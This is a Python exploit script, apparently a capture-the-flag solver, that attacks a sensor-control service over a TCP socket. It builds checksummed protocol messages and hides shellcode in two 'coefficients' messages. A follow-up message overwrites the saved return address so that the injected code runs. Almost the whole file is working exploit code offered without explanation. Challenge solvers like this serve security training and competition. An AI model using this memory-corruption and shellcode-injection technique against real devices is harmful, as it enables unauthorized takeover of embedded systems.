#!/bin/python3

import subprocess
import time
import struct
import sys
import threading
import socket
import os

#shellcode = b"\x04\x00\r4\x08\x00\x084\x00\xa2\t<\x00\x80)5\x00\xa3\n<$\x00J5\x00\x00\x0b4\x00\x00\"\x8d\x00\x00\x00\x00\x00\x00B\xad\x04\x00)%\x04\x00J%\x01\x00k%\xf9\xffm\x15\x00\x00\x00\x00\x00\xa3\x0c< \x00\x8c5\x00\x00\x88\xa1\x00\x00\x8e\x81\x00\x00\x00\x00\x00\x00\x00\x00\xfc\xff\xc0\x1d\x00\x00\x00\x00\xff\xff\x08!\xeb\xff\x00\x15\x00\x00\x00\x00\xff\xff\x00\x10\x00\x00\x00\x00"

shellcode = b"\x00\x00\x00\x00\x04\x00\r4\x08\x00\x084\x00\xa2\t<\x00\x80)5\x00\xa3\n<$\x00J5\x00\x00\x0b4\x00\x00\"\x8d\x00\x00\x00\x00\x00\x00B\xad\x04\x00)%\x04\x00J%\x01\x00k%\xf9\xffm\x15\x00\x00\x00\x00\x00\xa3\x0c< \x00\x8c5\x00\x00\x88\xa1\x00\x00\x00\x00\x00\x00\x8e\x81\x00\x00\x00\x00\xfc\xff\xc0\x1d\x00\x00\x00\x00\xff\xff\x08!\xeb\xff\x00\x15\x00\x00\x00\x00\xff\xff\x00\x10"

shellcode_part1 = shellcode[0:56]
shellcode_part2 = shellcode[56:]

shellcode_part2 += b'\x00' * (56-len(shellcode_part2))

ENABLE_SENSOR = 0x10
DISABLE_SENSOR = 0x20
SET_COEFFICIENTS1 = 0x30
SET_COEFFICIENTS2 = 0x31
SET_BIAS = 0x40
SET_TWO_POINTS = 0x58
UPDATE_FILTERS = 0x60


def receive_output(fsock):

    while True:
        try:

            data =fsock.read(16)

            if len(data) == 0:
                break

            sys.stdout.write(data)
        #print("received {} bytes of data\n".format(len(data)),file=sys.stderr)
        # print(data)
            sys.stdout.flush()

        except:
            pass

def do_checksum(message):

    checksum = 0

    for i in range(0, 58):
        checksum += message[i+2]

    checksum = 0xff - (checksum & 0xff)
    message[60] = checksum & 0xff

    return message
    

def send_coefficients(channel, messageType, coefficients):

    message = bytearray(b'\x00'*64)
    message[0] = 0xa5
    message[1] = 0x5a

    message[2] = messageType
    message[3] = 56

    message[4:60] = coefficients

    message = do_checksum(message)

    channel.send(message)


def send_bias(channel):

    message = bytearray(b'\x00'*64)
    message[0] = 0xa5
    message[1] = 0x5a

    message[2] = SET_BIAS
    message[3] = 8

    message[4:12] = struct.pack("d", 2.4319)
    message = do_checksum(message)

    channel.send(message)

def send_two_points(channel):

    message = bytearray(b'\x00'*64)
    message[0] = 0xa5
    message[1] = 0x5a

    message[2] = SET_TWO_POINTS
    message[3] = 8

    message[4:12] = struct.pack("2I", 0xa0180590, 0xa0180590)

    message = do_checksum(message)

    channel.send(message)


def send_enable(channel):

    message = bytearray(b'\x00'*64)
    message[0] = 0xa5
    message[1] = 0x5a

    message[2] = ENABLE_SENSOR
    message[3] = 0

    message = do_checksum(message)

    channel.send(message)


def send_disable(channel):

    message = bytearray(b'\x00'*64)
    message[0] = 0xa5
    message[1] = 0x5a

    message[2] = DISABLE_SENSOR
    message[3] = 0

    message = do_checksum(message)

    channel.send(message)


def main():

    if 'CHAL_HOST' in os.environ and 'CHAL_PORT' in os.environ:
        host = os.environ.get('CHAL_HOST')
        port = os.environ.get('CHAL_PORT')
        ticket = os.environ.get('TICKET', "")
    else:
        print('[ERROR] CHAL_HOST and CHAL_PORT environment variables are required')
        exit(-1)
    
    #Get the host:port from LCM 
    sys.stderr.write('Connecting to {}:{}\n'.format(host,port))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, int(port)))
    fsock = sock.makefile('rw')
    if len(ticket):
        print('Sending ticket')
        line =  fsock.readline()
        fsock.write(ticket + '\n')
        fsock.flush()

    th = threading.Thread(target=receive_output, args=(fsock,), daemon=True)

    th.start()

    time.sleep(.5)
    
    sys.stdout.write("disabling sensor readout\n")

    send_disable(sock)

    # time.sleep(.5)

    sys.stdout.write("sending shellcode1 in coefficients1\n")

    send_coefficients(sock, SET_COEFFICIENTS1, shellcode_part1)

    # time.sleep(.5)

    sys.stdout.write("sending shellcode2 in coefficients2\n")

    send_coefficients(sock, SET_COEFFICIENTS2, shellcode_part2)

    # time.sleep(.5)

    sys.stdout.write("sending overwrite of saved RA\n")

    send_two_points(sock)

    time.sleep(1)

    print()

if __name__ == "__main__":
    main()
